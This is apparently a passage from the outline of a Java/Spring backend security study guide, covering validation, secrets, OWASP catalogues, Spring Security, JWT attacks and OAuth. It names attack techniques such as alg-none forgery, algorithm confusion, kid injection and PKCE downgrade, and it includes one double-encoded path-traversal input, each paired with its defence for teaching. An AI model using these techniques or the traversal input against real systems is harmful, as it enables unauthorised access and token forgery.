1.14.17 **Trusted Types**: `require-trusted-types-for 'script'` makes DOM XSS sinks reject plain
        strings, forcing every assignment through a vetted policy — one of the few controls that
        *eliminates* a bug class rather than mitigating it. `trusted-types` names the allowed
        policies; `default` policy semantics. `[SPEC]` `[PROVE]` `[RESEARCH]`
1.14.18 **Subresource Integrity**: `integrity="sha384-..."` plus `crossorigin`, what it protects
        (a compromised CDN serving modified JS), and what it does not (a compromised first-party
        build). `[SPEC]` `[PROVE]`
1.14.19 The `sandbox` directive and the `<iframe sandbox>` attribute token list —
        `allow-scripts`, `allow-same-origin`, `allow-forms`, `allow-popups`,
        `allow-top-navigation`, `allow-modals` — and why `allow-scripts allow-same-origin`
        together defeat the sandbox. `[NUM]` `[TRAP]`
1.14.20 Spring Security's headers DSL: the defaults it writes out of the box, plus
        `headers(h -> h.contentSecurityPolicy(...).frameOptions(...).httpStrictTransportSecurity(...)
        .referrerPolicy(...).permissionsPolicyHeader(...).crossOriginOpenerPolicy(...))`, and
        `HeaderWriter`/`StaticHeadersWriter` for anything else. `[API]` `[NUM]`

*(20 leaves)*

## §1.15 Input validation and output encoding

1.15.1 The correct mental model: **validation is not a security control by itself, it is a
       correctness control that reduces attack surface**. The security control is the safe API at
       the boundary. Saying it the other way round produces the "we validate so we don't need
       parameterized queries" bug. `[PROVE]` `[TRAP]`
1.15.2 Syntactic vs semantic validation, and where each belongs.
1.15.3 Validate on **type, length, range, format, and set membership**, in that order of
       cheapness. `[TABLE]`
1.15.4 Canonicalization *before* validation, and the double-decoding bug that follows from getting
       the order wrong (`%252e%252e%252f`). `[PROVE]` `[ATTACK]`
1.15.5 Unicode hazards: normalization forms (NFC/NFKC), homoglyphs, bidi control characters (the
       Trojan Source class), overlong UTF-8, and best-fit mapping. `[RESEARCH]`
1.15.6 Where validation must run: **server-side, always**; client-side is UX only. `[PROVE]`
1.15.7 Bean Validation (Jakarta) as the mechanism: `@Valid`/`@Validated`, the constraint set
       (`@NotNull`, `@Size`, `@Pattern`, `@Email`, `@Positive`, `@DecimalMin`), custom
       `ConstraintValidator`, group sequences, and validating at the DTO boundary rather than the
       entity. `[API]`
1.15.8 Records + compact constructors as validation-at-construction, so an invalid `DepositRequest`
       cannot exist. `[API]` `[PROVE]`
1.15.9 Rejecting unknown fields as an anti-mass-assignment control:
       `spring.jackson.deserialization.fail-on-unknown-properties`, `@JsonIgnoreProperties`,
       explicit DTOs instead of entity binding, and `@JsonProperty(access = READ_ONLY)`.
       `[API]` `[NUM]`
1.15.10 **Output encoding is per destination context, decided at the moment of writing**, not at
        the moment of storing — because the same stored string goes to HTML, JSON, a log, a CSV and
        a SQL parameter, each needing something different. Store raw, encode on output. `[PROVE]`
        `[TRAP]`
1.15.11 The exception that proves the rule: rich text, which must be sanitized on *input* because
        you cannot encode it and still render it. `[PROVE]`
1.15.12 ReDoS: catastrophic backtracking in a validation regex turns your validator into a DoS
        vector. The nested-quantifier signature, `Pattern` timeouts (there are none in Java), and
        the input-length cap as the practical fix. `[ATTACK]` `[NUM]`
1.15.13 Mass assignment / autobinding as a validation failure, with the QuizStakes example: a
        client POSTing `bonusBalance` into an onboarding update. `[ATTACK]`
1.15.14 Error messages that validate securely: enough for the caller to fix the request, not enough
        to enumerate valid values or reveal internals. `[X-REF 12]`

*(14 leaves)*

## §1.16 Secrets hygiene — the basics

1.16.1 What counts as a secret, enumerated: passwords, API keys, client secrets, signing keys,
       encryption keys, DB connection strings, TLS private keys, webhook signing secrets, session
       secrets, service-account JSON, SSH keys, pepper.
1.16.2 Where secrets must **never** live: source code, git history, Dockerfiles and image layers
       (`docker history` shows build args), CI logs, application logs, exception messages, URLs and
       query strings, client-side code and mobile bundles, config files "temporarily" committed,
       Kubernetes manifests in a repo, JIRA tickets, Slack. `[TABLE]`
1.16.3 The rule that follows from git's object model: **a secret committed to git is compromised;
       rotate it, do not just delete the line.** Rewriting history does not un-clone the repo.
       `[PROVE]` `[X-REF 17]`
1.16.4 Where secrets should live: a secrets manager (AWS Secrets Manager, HashiCorp Vault, GCP
       Secret Manager, Azure Key Vault), injected at runtime; better, **no long-lived credential at
       all** via IAM roles / workload identity. `[TABLE]` `[X-REF 18]`
1.16.5 Environment variables as the pragmatic middle: what they leak (`/proc/<pid>/environ`, crash
       dumps, child processes, `docker inspect`) and when a mounted file is better. `[PROVE]`
1.16.6 Rotation: on a schedule, immediately on suspicion, and the design requirement that makes it
       possible — support **two valid keys at once** so rotation is not an outage. `[PROVE]`
1.16.7 Least-privilege scoping so one leak is not total, and per-environment separation so a dev
       leak is not a prod incident.
1.16.8 Detection: pre-commit and CI scanning (gitleaks, trufflehog, `detect-secrets`), GitHub secret
       scanning and push protection, and key prefixes that make your own keys detectable.
1.16.9 The incident procedure when a secret leaks, as an ordered runbook: rotate, revoke, audit the
       usage logs for the exposure window, then clean history. In that order. `[FLOW]`
1.16.10 Spring's config surface and its traps: `application.yml` in the jar, `@Value` on a secret,
        `/actuator/env` and `/actuator/configprops` exposure, `management.endpoint.env.show-values`,
        and Spring Cloud Config / Vault integration. `[API]` `[TRAP]`

*(10 leaves)*

## §1.17 The catalogues — how the industry indexes this topic

1.17.1 **OWASP Top 10:2025**, all ten with the exact identifiers: A01 Broken Access Control, A02
       Security Misconfiguration, A03 Software Supply Chain Failures, A04 Cryptographic Failures,
       A05 Injection, A06 Insecure Design, A07 Authentication Failures, A08 Software or Data
       Integrity Failures, A09 Security Logging and Alerting Failures, A10 Mishandling of
       Exceptional Conditions. `[TABLE]` `[VERSION-TRAP]` `[RESEARCH]`
1.17.2 **OWASP Top 10:2021**, all ten, kept because it is what most interviewers know: A01 Broken
       Access Control, A02 Cryptographic Failures, A03 Injection, A04 Insecure Design, A05 Security
       Misconfiguration, A06 Vulnerable and Outdated Components, A07 Identification and
       Authentication Failures, A08 Software and Data Integrity Failures, A09 Security Logging and
       Monitoring Failures, A10 SSRF. `[TABLE]`
1.17.3 The **2021 → 2025 diff**, stated explicitly: two new categories (Supply Chain, Exceptional
       Conditions), Misconfiguration 5→2, Components subsumed into Supply Chain, Logging renamed to
       include Alerting, and **SSRF no longer a standalone entry**. `[TABLE]` `[VERSION-TRAP]`
       `[RESEARCH]`
1.17.4 One concrete backend-Java exploit **and** fix for each of the ten, on QuizStakes surfaces —
       this is the table the guide is graded on. `[TABLE]` `[ATTACK]`
1.17.5 The methodology behind the list, so you can state its limits: contributed CWE-mapped data
       plus a community survey, incidence-rate ranking, and the fact that it is an *awareness*
       document, not a verification standard. `[SOURCE]` `[TRAP]`
1.17.6 **OWASP API Security Top 10:2023**, all ten: API1 BOLA, API2 Broken Authentication, API3
       BOPLA, API4 Unrestricted Resource Consumption, API5 BFLA, API6 Unrestricted Access to
       Sensitive Business Flows, API7 SSRF, API8 Security Misconfiguration, API9 Improper Inventory
       Management, API10 Unsafe Consumption of APIs. Why a separate list exists at all.
       `[TABLE]` `[RESEARCH]`
1.17.7 API6 — **unrestricted access to sensitive business flows** — as the category most directly
       about QuizStakes: automated bonus farming against the "10% of first deposit capped at 100"
       rule is not a technical vulnerability and is still an incident. `[SOURCE]` `[NUM]`
1.17.8 **OWASP ASVS 5.0.0**: 17 chapters (V1 Encoding and Sanitization, V2 Validation and Business
       Logic, V3 Web Frontend Security, V4 API and Web Service, V5 File Handling, V6
       Authentication, V7 Session Management, V8 Authorization, V9 Self-contained Tokens, V10 OAuth
       and OIDC, V11 Cryptography, V12 Secure Communication, V13 Configuration, V14 Data
       Protection, V15 Secure Coding and Architecture, V16 Security Logging and Error Handling, V17
       WebRTC), ~350 requirements, and the L1/L2/L3 levels. How to use it as a design checklist
       rather than an audit burden. `[TABLE]` `[NUM]` `[RESEARCH]`
1.17.9 The other OWASP artifacts worth knowing by name: Cheat Sheet Series, Proactive Controls,
       SAMM, WSTG (testing guide), Dependency-Check, Dependency-Track, ZAP, Java Encoder, Java HTML
       Sanitizer, `OWASP Top 10 for LLM Applications`. `[TABLE]`
1.17.10 **CWE** as the weakness taxonomy, the CWE Top 25, and the entries a Java backend engineer
        should recognise by number: CWE-79 XSS, CWE-89 SQLi, CWE-22 path traversal, CWE-352 CSRF,
        CWE-918 SSRF, CWE-502 deserialization, CWE-287 improper authentication, CWE-639
        authorization bypass via user-controlled key, CWE-798 hard-coded credentials, CWE-611 XXE,
        CWE-77/78 command injection, CWE-400 resource exhaustion. `[TABLE]` `[NUM]`
1.17.11 **CVE / GHSA / OSV** as vulnerability identifiers, **CVSS 4.0** as severity (base, threat,
        environmental, supplemental metric groups), **EPSS** as exploit probability, **CISA KEV**
        as known-exploited. The triage rule: KEV first, then EPSS × reachability, and CVSS last.
        `[PROVE]` `[VERSION-TRAP]`
1.17.12 Compliance frameworks you will be asked to name and their relation to engineering work:
        PCI-DSS (if QuizStakes touches card data), SOC 2, ISO 27001, GDPR (and its
        breach-notification clock), and gambling-regulator requirements. What each actually
        mandates versus what teams assume. `[TABLE]` `[RESEARCH]`

*(12 leaves)*

## §1.18 Spring Security — orientation

1.18.1 What Spring Security is: a **servlet filter** that runs before your application and turns
       HTTP requests into authenticated, authorized invocations. Understanding it as one filter is
       the key that unlocks everything else. `[PROVE]` `[X-REF 07]`
1.18.2 `DelegatingFilterProxy` — the container-registered filter that bridges the servlet lifecycle
       to a Spring bean, resolved lazily from the `ApplicationContext`. `[API]` `[SOURCE]`
1.18.3 `FilterChainProxy` — the single Spring-managed filter that holds all the
       `SecurityFilterChain`s, applies the `HttpFirewall`, and clears the `SecurityContext` after
       the request to avoid leaking identity across pooled threads. `[API]` `[SOURCE]`
1.18.4 `SecurityFilterChain` — a `RequestMatcher` plus an ordered `List<Filter>`; **only the first
       matching chain runs**, and that single sentence explains most multi-chain
       misconfigurations. `[API]` `[PROVE]` `[TRAP]`
1.18.5 The core domain types: `SecurityContextHolder` → `SecurityContext` → `Authentication` →
       `Principal` + `credentials` + `Collection<GrantedAuthority>` + `authenticated` flag.
       `[API]`
1.18.6 `AuthenticationManager` → `ProviderManager` → `List<AuthenticationProvider>`, and the
       "supports + authenticate, first non-null wins, parent as fallback" contract. `[API]`
       `[SOURCE]`
1.18.7 `UserDetailsService` / `UserDetails` / `PasswordEncoder` as the username-password provider's
       three collaborators, and `DaoAuthenticationProvider` as the thing that wires them. `[API]`
1.18.8 `AuthorizationManager` (6.x) replacing the older `AccessDecisionManager`/voter model, and
       `AuthorizationFilter` replacing `FilterSecurityInterceptor`. `[API]` `[VERSION-TRAP]`
1.18.9 `ExceptionTranslationFilter` as the piece that turns exceptions into HTTP: an
       `AuthenticationException` → clear the context, save the request in the `RequestCache`, invoke
       the `AuthenticationEntryPoint` (401 / login redirect); an `AccessDeniedException` → invoke
       the `AccessDeniedHandler` (403). This is where 401-vs-403 is actually decided. `[API]`
       `[SOURCE]` `[FLOW]`
1.18.10 `SecurityContextRepository` and `SecurityContextHolderFilter` — how identity persists (or
        deliberately does not) between requests. `[API]`
1.18.11 The minimal modern configuration, and every line of it explained: a `SecurityFilterChain`
        bean with `authorizeHttpRequests`, `csrf`, `httpBasic`/`formLogin`/`oauth2ResourceServer`,
        `sessionManagement`, `headers`, `cors`, `exceptionHandling`. `[API]` `[BUILD]`
1.18.12 The `@EnableWebSecurity` / `@EnableMethodSecurity` / `@EnableGlobalAuthentication`
        annotations and what each actually imports. `[API]`
1.18.13 Boot's auto-configuration defaults, stated as facts you must know are happening: a default
        chain protecting everything, a generated password logged at startup, CSRF on, a default
        login page, session fixation protection, and the security headers of § 1.14.20. `[NUM]`
1.18.14 Method security: `@PreAuthorize`, `@PostAuthorize`, `@PreFilter`, `@PostFilter`, `@Secured`,
        JSR-250 (`@RolesAllowed`), the SpEL expression root (`authentication`, `principal`,
        `hasRole`, `hasAuthority`, `hasPermission`, `#paramName`, `returnObject`), and the
        **proxy-based limitation**: a self-invocation bypasses it, exactly as with `@Transactional`.
        `[API]` `[TRAP]` `[X-REF 07]`
1.18.15 `@AuthenticationPrincipal`, `@CurrentSecurityContext`, and getting the caller in a
        controller without touching the holder. `[API]`
1.18.16 The Spring Security 7.0 delta as a single leaf so the reader is not surprised: lambda DSL
        mandatory, `authorizeRequests()` gone, `PathPatternRequestMatcher` replacing
        `MvcRequestMatcher`/`AntPathRequestMatcher`, native MFA, passkeys, one-time-token login,
        `csrf().spa()`, `AuthorizationManagerFactory`, `Authentication.Builder`, PKCE on by
        default, OAuth2 password grant removed, OpenSAML 4 support removed. `[VERSION-TRAP]`
        `[RESEARCH]`

*(16 leaves)*

**PART 1 total: 280 leaves.**

---

# PART 2 — INTERMEDIATE

## §2.1 The master tables

2.1.1 **The master attack/defence table** — one row per attack class, with columns: what the
      attacker controls, the boundary crossed, the primary defence (and its mechanism), the
      defence-in-depth layer, the detection signal, the OWASP mapping, and the CWE number. Every
      attack in this guide appears exactly once in this table. `[TABLE]`
2.1.2 **The master credential-transport table**: cookie session, cookie + JWT, `Authorization:
      Bearer`, `Authorization: DPoP`, mTLS client cert, HMAC-signed request, API key header, signed
      URL — with columns for ambient (CSRF applies), XSS-readable, revocable, replayable,
      cross-domain, and audience-bindable. `[TABLE]` `[PROVE]`
2.1.3 **The master token-lifetime table**: authorization code, access token, refresh token, ID
      token, session, CSRF token, password-reset token, email-verification token, TOTP window,
      signed URL, JWKS cache — each with a recommended lifetime, the reason, and the QuizStakes
      value. `[TABLE]` `[NUM]`
2.1.4 **The master "which auth mechanism" decision table**: first-party browser app, first-party
      SPA, first-party mobile, third-party integration, backend-to-backend inside the perimeter,
      backend-to-backend across organisations, operator/admin console, webhook receiver, batch job.
      With the QuizStakes assignment for each. `[TABLE]` `[PROVE]`
2.1.5 **The master crypto-primitive table**: what to use for confidentiality, authenticated
      encryption, integrity of a message with a shared secret, integrity with a public key,
      password storage, key derivation from a key, key derivation from a password, random values,
      and hashing for identity — with the exact Java algorithm string for each. `[TABLE]` `[API]`
2.1.6 **The master cost table**: the latency and CPU cost of each control, because a security answer
      that ignores the 30 ms restriction budget and the 150 ms stake-reservation budget is not a
      staff-level answer — TLS handshake, bcrypt at cost 12, Argon2id at 46 MiB, RSA-2048 verify,
      ES256 verify, HMAC-SHA256 verify, a JWKS fetch, an introspection call, a Redis session
      lookup, a policy-engine call, a rate-limit check. `[TABLE]` `[NUM]` `[PROVE]`

*(6 leaves)*

## §2.2 Sessions vs tokens, and where a token lives

2.2.1 **Server-side sessions**, restated with the trade-offs made explicit: opaque random id in a
      cookie, state in a shared store; revocation is instant (delete the row); every request costs a
      store lookup; scaling needs the shared store; cookies are ambient so CSRF applies. `[TABLE]`
2.2.2 **Self-contained tokens**: claims plus a signature, verified with a key, no server state;
      scales trivially, crosses services and domains; **cannot be revoked before expiry** without
      reintroducing state. That is the whole trade-off, and saying it in one sentence is the answer.
      `[PROVE]`
2.2.3 **The standard resolution**: a short-lived access token (5–15 min) plus a long-lived,
      **stateful, rotating** refresh token. Revocation happens at refresh time, so worst-case
      exposure is one access-token lifetime. `[PROVE]` `[NUM]`
2.2.4 The emergency-revocation layer when one access-token lifetime is too long: a `jti` denylist in
      Redis with a TTL equal to the token lifetime — which is *bounded* state, unlike a full
      allowlist. `[PROVE]` `[NUM]`
2.2.5 **Refresh-token rotation with reuse detection**: each refresh issues a new refresh token and
      invalidates the old one; presenting a used token means it was stolen, so the whole family is
      revoked. The token-family / lineage data model. `[FLOW]` `[PROVE]`
2.2.6 The race that breaks naive rotation: two parallel tabs refresh at once and the second gets
      revoked. The grace-window and single-flight mitigations. `[TRAP]` `[X-REF 05]`
2.2.7 **Token storage in a browser**, all five options with the exact trade: `localStorage`
      (XSS-readable, survives tab close), `sessionStorage` (XSS-readable, per-tab), in-memory JS
      variable (XSS-readable only while running, lost on reload), `HttpOnly` cookie (not
      JS-readable, ambient so CSRF applies), and the **hybrid** — access token in memory, refresh
      token in a `__Host-`-prefixed `HttpOnly` `SameSite=Strict` cookie scoped to the refresh
      endpoint. `[TABLE]` `[PROVE]`
2.2.8 **Trap: "we use JWTs so we are not vulnerable to CSRF."** False the moment the JWT is in a
      cookie. CSRF is a property of the *transport*, not the token format. `[TRAP]`
2.2.9 **Trap: "`HttpOnly` protects us from XSS."** It protects the token's *value*; injected script
      can still issue authenticated requests from the victim's browser. `[TRAP]` `[PROVE]`
2.2.10 The **BFF (backend-for-frontend)** pattern as the current recommendation for browser apps:
       the browser holds only a cookie session, the BFF holds the tokens, and no token ever touches
       JavaScript. What it costs (a stateful component) and what it buys (XSS cannot exfiltrate a
       token). `[PROVE]` `[RESEARCH]`
2.2.11 The token-handler / split-cookie variants and where the OAuth browser-based-apps BCP lands.
       `[RESEARCH]`
2.2.12 The QuizStakes decision, fully justified: the client token is **stripped at
       `ApplicationGateway`** and replaced with a short-lived internal application token issued by
       `JwtService`; internal services never see a client-controlled token; and because **no token
       carries permissions, restrictions or account status**, the token is an identity assertion
       only. Walk what this buys: no claim staleness, no privilege escalation via a forged claim,
       and a single revocation point. `[SOURCE]` `[PROVE]`
2.2.13 When a session is simply the right answer and JWT is cargo cult: a single first-party web
       app with a server-rendered UI and one backend. Say so out loud. `[TRAP]`
2.2.14 Sessions in a horizontally scaled deployment: Spring Session with Redis/JDBC/Hazelcast, the
       serialization choice, and the "session store outage = total logout" failure mode.
       `[X-REF 15]`
2.2.15 Sliding vs absolute expiry implemented in a shared store, and the write-amplification cost of
       touching the session on every request. `[NUM]`

*(15 leaves)*

## §2.3 JWT and JOSE

2.3.1 The JOSE family, named properly: **JWS** (RFC 7515, signed), **JWE** (RFC 7516, encrypted),
      **JWK/JWKS** (RFC 7517, key representation), **JWA** (RFC 7518, algorithm registry), **JWT**
      (RFC 7519, a *claims set* carried in a JWS or JWE). A JWT is not a format, it is a payload
      convention. `[SPEC]` `[PROVE]`
2.3.2 The **compact serialization** of a JWS: `BASE64URL(header) '.' BASE64URL(payload) '.'
      BASE64URL(signature)`, with the signing input being the first two segments joined by a dot —
      which is *why* the header is covered by the signature. `[SPEC]` `[WIRE]` `[PROVE]`
2.3.3 **base64url vs base64**: `-`/`_` instead of `+`/`/`, no padding. Why a JWT is URL-safe and why
      a naive base64 decoder fails on it. `[SPEC]` `[NUM]`
2.3.4 JWS **JSON serialization** (general and flattened), multiple signatures, and why almost
      nobody uses it.
2.3.5 The registered **header parameters**: `alg`, `jku`, `jwk`, `kid`, `x5u`, `x5c`, `x5t`,
      `x5t#S256`, `typ`, `cty`, `crit`. Which of these are attacker-controlled input — all of
      them. `[SPEC]` `[TABLE]`
2.3.6 The registered **claims**: `iss`, `sub`, `aud`, `exp`, `nbf`, `iat`, `jti`. Types, and the
      `aud` string-or-array ambiguity. `[SPEC]` `[NUM]`
2.3.7 **The payload is base64, not encrypted — anyone can read it.** No PII, no secrets, nothing
      you would not publish. The signature gives integrity and origin, never confidentiality.
      `[PROVE]` `[TRAP]`
2.3.8 **The validation checklist, every item a real CVE class**: (1) signature verifies against the
      expected key; (2) **`alg` is pinned server-side**, never read from the token; (3) `exp` not
      passed and `nbf` not future, with a bounded clock-skew allowance; (4) `iss` is your issuer;
      (5) `aud` includes **your** service; (6) `typ` is what you expect; (7) the scopes/roles
      actually authorize this specific action; (8) `jti` not on the denylist. `[TABLE]` `[PROVE]`
2.3.9 **Attack — `alg: none`.** The attacker edits `sub` to an admin id and strips the signature;
      libraries that honoured `none` accepted it. RFC 8725 § 3.2's rule and the "reject explicitly"
      requirement. `[ATTACK]` `[SPEC]` `[CVE]`
2.3.10 **Attack — algorithm confusion (RS256 → HS256).** The verifying server's *public* key is
       public; the attacker sets `alg: HS256` and signs with the public key bytes as the HMAC
       secret. A `verify(token, key)` that infers the algorithm from the header accepts it. Fix:
       pin the algorithm, and use key types that cannot be reinterpreted. `[ATTACK]` `[PROVE]`
       `[CVE]`
2.3.11 **Attack — `jku` / `jwk` / `x5u` header injection.** The token tells you where to fetch the
       key from, you fetch it from the attacker, and you verify against the attacker's key. Also an
       SSRF primitive. RFC 8725 § 3.10 — "do not trust received claims". `[ATTACK]` `[SPEC]`
2.3.12 **Attack — `kid` injection**: path traversal to a known file used as an HMAC key, and SQL
       injection where `kid` indexes a key table. `[ATTACK]`
2.3.13 **Attack — weak HMAC secret.** `HS256` with a human-chosen secret is offline-brute-forceable;
       RFC 8725 § 3.5 requires the key to have entropy ≥ the hash output size (256 bits for HS256).
       `hashcat` mode for JWT exists for exactly this. `[NUM]` `[PROVE]` `[ATTACK]`
2.3.14 **Attack — substitution / audience confusion.** A token legitimately issued for
       `DocumentRequirements` is replayed at `FundsLedger`; without an `aud` check it works. RFC
       8725 § 2.7 and § 3.9. `[ATTACK]` `[PROVE]`
2.3.15 **Attack — cross-JWT confusion.** An ID token used as an access token, a logout token used as
       an ID token. The fixes: explicit `typ` (RFC 9068's `at+jwt` for access tokens), distinct
       issuers, distinct keys, and **mutually exclusive validation rules** (RFC 8725 § 3.11–3.12).
       `[ATTACK]` `[SPEC]`
2.3.16 **Attack — claim-type and JSON-parsing confusion**: duplicate JSON keys, numeric-vs-string
       `exp`, `aud` as string vs array, and RFC 8725 § 2.6's multiplicity-of-encodings warning.
       `[ATTACK]` `[SPEC]`
2.3.17 **Attack — indirect attacks via claims** (RFC 8725 § 2.9): a `sub` used in a SQL lookup or a
       log line is still untrusted *structure* even though it is authenticated *content*. `[PROVE]`
2.3.18 **Attack — nested JWS-in-JWE with the inner signature unverified** (RFC 8725 § 2.3): decrypt
       succeeded, so the developer assumes authenticity. `[ATTACK]` `[SPEC]`
2.3.19 **JWE**: five parts (`header.encrypted_key.iv.ciphertext.tag`), the `alg` (key management) /
       `enc` (content encryption) split, the common algorithm pairs, and the honest assessment —
       rare, and usually the wrong tool because TLS already gives you transport confidentiality.
       `[SPEC]` `[WIRE]` `[NUM]`
2.3.20 **JWE's `zip` compression pitfall** (RFC 8725 § 2.4 / § 3.6): compressing before encrypting
       leaks plaintext structure through ciphertext length — the CRIME/BREACH argument applied to
       tokens. `[PROVE]` `[SPEC]`
2.3.21 **JWK and JWKS**: the key object fields (`kty`, `use`, `key_ops`, `alg`, `kid`, and the
       per-type parameters `n`/`e` for RSA, `crv`/`x`/`y` for EC, `k` for oct), the JWKS document,
       and the `/.well-known/jwks.json` convention. `[SPEC]` `[WIRE]`
2.3.22 **JWKS fetching and caching mechanics**: cache by `kid`, refresh on unknown `kid` with a rate
       limit (or an attacker DoSes your issuer through you), a bounded negative cache, and a
       fail-closed policy if the JWKS is unavailable. `[PROVE]` `[NUM]`
2.3.23 **Key rotation with `kid`**: publish the new key before signing with it, sign with the new
       key, keep the old key published for at least one max-token-lifetime, then remove. The
       overlap window is the whole design. `[FLOW]` `[PROVE]`
2.3.24 Algorithm selection: `RS256` (ubiquitous), `PS256` (RSASSA-PSS, preferred where supported),
       `ES256` (compact, fast verify), `EdDSA`/`Ed25519` (RFC 8037), `HS256` (only when the same
       party signs and verifies). Signature and key sizes for each. `[TABLE]` `[NUM]`
2.3.25 Why **asymmetric** is the right default for tokens crossing a trust boundary: verification
       requires no secret, so a compromised resource server cannot mint tokens. In QuizStakes,
       `JwtService` signs and every other service only verifies. `[PROVE]` `[SOURCE]`
2.3.26 Clock skew: a bounded allowance (30–60 s), why unbounded skew tolerance is an expiry bypass,
       and NTP as an actual security dependency. `[NUM]` `[TRAP]`
2.3.27 Token size as an operational constraint: JWT in a cookie versus the 4096-octet cookie limit;
       JWT in a header versus proxy header limits (8 KB typical); 2.4M clients × claim bloat.
       `[NUM]` `[X-REF 10]`
2.3.28 The Java libraries and their safety posture: Nimbus JOSE+JWT (what Spring Security uses),
       `java-jwt` (Auth0), `jjwt`, and the API-design lesson — a library whose `parse` infers the
       algorithm is a library with a footgun. `[API]` `[PROVE]`
2.3.29 Spring Security's resource-server surface: `JwtDecoder`, `NimbusJwtDecoder.withJwkSetUri(...)
       .jwsAlgorithm(...)`, `JwtValidators.createDefaultWithIssuer`,
       `JwtIssuerValidator`/`JwtTimestampValidator`/`JwtClaimValidator`,
       `DelegatingOAuth2TokenValidator`, `JwtAuthenticationConverter`,
       `JwtGrantedAuthoritiesConverter` (and the `SCOPE_` prefix), and
       `spring.security.oauth2.resourceserver.jwt.*` properties. `[API]` `[NUM]`
2.3.30 Opaque tokens and **introspection** (RFC 7662) as the alternative: `OpaqueTokenIntrospector`,
       the per-request network call, the caching decision, and the trade against a self-contained
       token. `[API]` `[TABLE]`
2.3.31 **RFC 9068 — the JWT profile for OAuth access tokens**: `typ: at+jwt`, the required claims,
       and why a standard profile removes the cross-JWT-confusion class. `[SPEC]` `[RESEARCH]`
2.3.32 What a JWT is genuinely good for, so the section does not read as anti-JWT: cross-service
       identity propagation inside a trust domain, short-lived capabilities, and signed
       non-repudiable assertions between organisations. `[PROVE]`

*(32 leaves)*

## §2.4 OAuth 2.0 and 2.1

2.4.1 What OAuth actually is: a **delegated authorization** framework so that a third party can act
      on a user's behalf **without the user's password**. It is not a login protocol and not an
      authorization model. `[PROVE]` `[TRAP]`
2.4.2 The problem it replaced: the password anti-pattern (giving app X your Google password), and
      why that framing makes every design decision in the spec obvious. `[PROVE]`
2.4.3 The four roles: resource owner, client, authorization server, resource server — with the
      QuizStakes mapping. `[TABLE]`
2.4.4 The endpoints: authorization, token, redirect (client-side), introspection, revocation,
      userinfo (OIDC), JWKS, PAR, device authorization, and the metadata document. `[TABLE]`
2.4.5 Client types: **confidential** vs **public**, and the fact that "public" means "cannot keep a
      secret", which is a property of the deployment (SPA, mobile), not a trust judgement.
      `[PROVE]`
2.4.6 The front channel vs back channel distinction, and why it is *the* organising idea of the
      spec: the front channel goes through the user's browser and is therefore attacker-observable;
      the back channel is a direct TLS-authenticated server-to-server call. `[PROVE]`
2.4.7 The parameters of an authorization request: `response_type`, `client_id`, `redirect_uri`,
      `scope`, `state`, `code_challenge`, `code_challenge_method`, `nonce`, `prompt`, `max_age`,
      `login_hint`, `resource`. `[TABLE]` `[WIRE]`
2.4.8 **Authorization Code + PKCE**, the full flow, step by step with the actual URLs: the
      `code_challenge` = BASE64URL(SHA256(`code_verifier`)) with `code_challenge_method=S256`, the
      `state`, the consent, the redirect with `code` + `state`, the back-channel POST with
      `code` + `code_verifier`, the AS's verification, and the token response. `[FLOW]` `[WIRE]`
2.4.9 **What PKCE defends against, precisely**: an attacker who intercepts the authorization code —
      via a malicious app registering the same custom URI scheme, a `Referer` leak, a compromised
      redirect, or a shared log — still cannot exchange it, because they do not have the verifier.
      `[PROVE]`
2.4.10 **What `state` defends against, precisely**: CSRF on the redirect endpoint — an attacker
       initiating a flow and delivering *their* code to the victim's session (session fixation of
       the OAuth flow). `state` is a per-flow, per-session unguessable value bound to the user
       agent. `[PROVE]` `[TRAP]`
2.4.11 The `code_verifier` requirements: 43–128 characters from the unreserved set, generated by a
       CSPRNG; `plain` method allowed only where S256 is impossible and forbidden in 2.1.
       `[SPEC]` `[NUM]`
2.4.12 `code_challenge_method` **downgrade attack** (RFC 9700 § 4.8): the attacker rewrites `S256`
       to `plain`; the AS must reject a `plain` exchange for a flow that requested `S256`.
       `[ATTACK]` `[SPEC]`
2.4.13 **Client credentials grant** — machine-to-machine, no user, no refresh token needed. Client
       authentication by secret (`client_secret_basic` / `client_secret_post`), by signed assertion
       (`private_key_jwt`, RFC 7523), or by mTLS (RFC 8705). The right flow for
       `PaymentService` → `FundsLedger`. `[FLOW]` `[TABLE]`
2.4.14 **Refresh token grant**, and the OAuth 2.1 requirement that public-client refresh tokens be
       sender-constrained or rotated. `[SPEC]` `[VERSION-TRAP]`
2.4.15 **Device authorization grant** (RFC 8628): the `device_code`/`user_code` pair, the polling
       interval and `slow_down`, and where it applies (TVs, CLIs). `[FLOW]` `[NUM]`
2.4.16 **Deprecated: implicit grant.** Returned the access token in the URL fragment: browser
       history, `Referer`, logs, no refresh, and no way to sender-constrain. Removed in 2.1.
       `[PROVE]` `[VERSION-TRAP]`
2.4.17 **Deprecated: resource owner password credentials.** The client handles the real password,
       defeating the entire point of delegation and blocking MFA/SSO/federation. RFC 9700 says
       **MUST NOT**; removed in 2.1; removed from Spring Security 7. `[PROVE]` `[VERSION-TRAP]`
2.4.18 Scopes: what they are (coarse capability strings the *user* consents to), what they are not
       (an authorization model), the naming conventions (`deposits:read`), the "scope is not
       permission" rule, and why a resource server must still check ownership. `[PROVE]` `[TRAP]`
2.4.19 **Audience restriction and resource indicators** (RFC 8707): `resource` parameter, `aud` in
       the issued token, and why a token minted for one service must not be accepted by another.
       `[SPEC]` `[PROVE]`
2.4.20 The **token response** fields: `access_token`, `token_type`, `expires_in`, `refresh_token`,
       `scope`, `id_token`; and the `Cache-Control: no-store` requirement on it. `[SPEC]` `[WIRE]`
2.4.21 Error responses: `invalid_request`, `invalid_client`, `invalid_grant`, `unauthorized_client`,
       `unsupported_grant_type`, `invalid_scope`, `access_denied`, `server_error`,
       `temporarily_unavailable` — and which of these leak information. `[TABLE]` `[SPEC]`
2.4.22 **Authorization server metadata** (RFC 8414) and `/.well-known/oauth-authorization-server`;
       what a client may safely auto-configure from it and the DoS/poisoning risk of trusting it
       blindly (RFC 9700). `[SPEC]`
2.4.23 **Dynamic client registration** (RFC 7591/7592) and when it is a liability.
2.4.24 **Token revocation** (RFC 7009): the endpoint, `token_type_hint`, and the fact that revoking
       a refresh token should revoke its access tokens. `[SPEC]`
2.4.25 **Token exchange** (RFC 8693): `subject_token`, `actor_token`, delegation vs impersonation,
       `may_act`, and its use for service-to-service calls that must preserve the end user's
       identity — the correct answer when `PaymentService` calls `FundsLedger` on behalf of a
       client. `[SPEC]` `[FLOW]` `[RESEARCH]`
2.4.26 **The complete OAuth 2.1 diff**, as one table: PKCE mandatory for all clients, exact-match
       redirect URIs (with the localhost port exception), implicit removed, ROPC removed, bearer
